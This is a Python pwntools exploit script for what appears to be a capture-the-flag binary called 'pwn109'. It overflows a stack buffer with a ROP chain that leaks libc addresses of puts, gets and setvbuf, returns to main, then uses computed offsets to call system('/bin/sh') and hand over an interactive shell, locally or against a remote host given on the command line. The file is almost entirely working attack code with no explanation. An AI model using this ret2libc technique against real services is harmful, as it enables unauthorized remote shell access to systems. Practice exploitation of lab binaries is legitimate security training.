import sys
from struct import *

from pwn import *

context(os="linux", arch="amd64")

elf = ELF("./pwn109-1644300507645.pwn109")
context.binary = binary = elf
# context.log_level = "debug"


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([binary.path] + argv, *a, **kw)


# 0x0000000000000af3 : pop rdi ; ret /// gadget rdi using send to put
# 0x0000000000401231 : ret
pop_rdi_ret = p64(0x00000000004012A3)
ret = p64(0x0000000000401231)
plt_puts_addr = p64(binary.plt.puts)
got_puts_addr = p64(binary.got.puts)
got_gets_addr = p64(binary.got.gets)
got_setvbuf_addr = p64(binary.got.setvbuf)
main_addr = p64(binary.symbols.main)


payload = b""
payload += b"A" * 0x20
payload += b"B" * 0x8
payload += pop_rdi_ret + got_puts_addr + plt_puts_addr
payload += pop_rdi_ret + got_gets_addr + plt_puts_addr
payload += pop_rdi_ret + got_setvbuf_addr + plt_puts_addr
payload += main_addr


io = start()
io.recvuntil(b"ahead")
io.recv()  # consume emoji


payload = b""
payload += b"A" * 0x20
payload += b"B" * 0x8
payload += pop_rdi_ret + got_puts_addr + plt_puts_addr
payload += pop_rdi_ret + got_gets_addr + plt_puts_addr
payload += pop_rdi_ret + got_setvbuf_addr + plt_puts_addr
payload += main_addr

io.sendline(payload)


output = io.recv().split(b"\n")

print(output)


leaked_puts_addr = u64(output[0].ljust(8, b"\x00"))
leaked_gets_addr = u64(output[1].ljust(8, b"\x00"))
leaked_setvbuf_addr = u64(output[2].ljust(8, b"\x00"))

print("leaked puts  address: {}".format(str(hex(leaked_puts_addr))))
print("leaked gets  address: {}".format(str(hex(leaked_gets_addr))))
print("leaked setvbuf  address: {}".format(str(hex(leaked_setvbuf_addr))))
################################# PHASE 2 ######################################

# system 	 	-0x316e0
# gets 	 	        0x0
# str_bin_sh 		0x130c4d


payload = b""
payload += b"A" * 0x20
payload += b"B" * 0x8
payload += ret + pop_rdi_ret + p64(leaked_gets_addr + 0x130C4D)  # load /bin/sh to rdi
payload += p64(leaked_gets_addr - 0x316E0)  # load shell by system call
io.sendline(payload)
io.interactive()
